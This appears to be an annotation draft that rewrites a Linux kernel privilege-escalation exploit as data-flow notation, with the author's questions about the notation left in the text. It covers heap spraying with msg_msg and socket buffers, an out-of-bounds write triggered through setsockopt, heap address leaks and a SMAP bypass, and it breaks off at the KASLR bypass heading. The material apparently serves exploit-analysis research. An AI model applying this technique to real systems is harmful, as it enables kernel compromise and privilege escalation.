 [data1] int s;
 [data2] int fd;
 [data3] int ss[NUM_SOCKETS][2];
 [data4] int pipefd[NUM_PIPEFDS][2];
 [data5] int msqid[NUM_MSQIDS];

 [data6] char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];

 [data7] struct msg_msg *msg;
 [data8] struct pipe_buf_operations *ops;
 [data9] struct pipe_buffer *buf;

 [data10] uint64_t kheap_addr = 0
 int fake_idx = -1, real_idx = -1;
 
 [data11] struct msg_primary;
 [data12] struct msg_secondary;
 [data13] struct msg_fake;

 [data14] struct data;
 [data15] uint64_t kbase_addr = 0;

====================================================
[flow] data1.0 ---= socket(conts) ---> data1.0 -- ## it does not chang a data structure

[flow] data3.0 * conts --- socketpair ---> data3.1,…,data3.4
[flow] data5.0 ---= msgget ---> data5.1,…,data5.4096

########################################
#### Step 1 – Memory Corruption #######
########################################
#### Spraying primary messages...####
[flow] data11.0 * "0" --- memset ---> data11.1.1,…,data11.1.4096
   *(int *)&[data11.1].mtext[0] = conts;
   *(int *)&[data11.1].mtext[4] = 1,…,4096;
### write primary messages to the message queue ####
## [flow] data5.1,…,data5.4096 * &data11.1 --- write_msg ---> &data11.1

#### Spraying secondary messages...####
[flow] data12.0 * "0"  --- memset ---> data12.1.1,…,data12.1.4096
   *(int *)&[data12.1].mtext[0] = conts;
   *(int *)&[data12.1].mtext[4] = 1,…,4096;
########## write secondary messages to the message queue  ############
## [flow] data5.1,…,data5.4096 * &data12.1 --- write_msg ---> &data12.1

########### creating holes in the primary message #############
[flow] data5.1,…,data5.3072 * &data11.1 --- read_msg --->  &data11.2 {data11.2.1024, data11.2.2048 ,data11.2.3072}

### trigger the out of bond write ###
[flow] data1.0  --- trigger_oob_write ---> data1.0
[flow] data1.0  * data14.0 * conts --- setsockopt ---> data14.1

### Searching for corrupted primary message ###
#### vulnerable state #######
[flow] data5.1,…,data5.4096 * &data12.1 --- peek_msg ---> data12.2.1,…,data12.2.4096
### fake_idx's primary message has a corrupted next pointer; wrongly 
### pointing to real_idx's secondary message. ##########
fake_idx = i;
real_idx = *(int *)&msg_secondary.mtext[4];

############################################
### Stage 2 - carry out the SMAP bypass ###
############################################

### Freeing real secondary message ###
[flow] data5.1{real_idx} * &data12.2 —read_msg—> &data12.3

######### Reclaim the previously freed secondary message with a fake msg_msg of #######
######### maximum possible size.

[flow] data6.0 * "0" —memset—> data6.1
[flow] data6.1 * conts —build_msg_msg—> data6.2
[flow] data3.1 * data6.2 —spray_skbuff—> data3.2

######### use fake secondary message to read out-of-bonds… #########
######### Leaking adjacent secondary message ##################
[flow] data5.1{fake_idx} * &data13.0 —peak_msg—> &data13.1


######### the secondary message contains a pointer to the primary message ##########
*** how represent assignment that changes the data structure? ***
#####
[flow] data7.0 —--= (msg_msg *)&data13.1.mtext[conts]--—> data7.1

[flow] data10.0 —--= data7.1->m_list_next --—> data10.1

**** How to convey if statement? ****
[flow] data10.1 —--= data7.1->m_list_prev --—> data10.2

<<-- should this assignment be covered ??? -->>
### kheap_addr -= SECONDARY_SIZE;


####### freeing fake secondary message ###########
#### read from data3.1 to data6.2
[flow] data3.1 * data6.2 —free_skbuff—> data6.3

 ####### Put kheap_addr at next to leak its content.
 ############## Assumes zero bytes before -- kheap_addr.
[flow] data6.3 * "0" --memset--> data6.4
[flow] data6.4 * conts —build_msg_msg—> data6.5
[flow] data3.2 * data6.5 —spray_skbuff—> data3.3

[flow] data5.1{fake_idx} * &data13.1 —peek_msg—> &data13.2

[flow] data7.1 —--= (msg_msg *)&data13.2.mtext[conts]--—> data7.2
[flow] data10.2 —--= data7.2->m_list_next --—> data10.3

*********under the if condition ***
[flow] data10.3 —--= data7.2->m_list_prev --—> data10.4

<<-- should this assignment be covered -->>
### kheap_addr -= SECONDARY_SIZE;

============================================================

⇒ STAGE 3: KASLR bypass


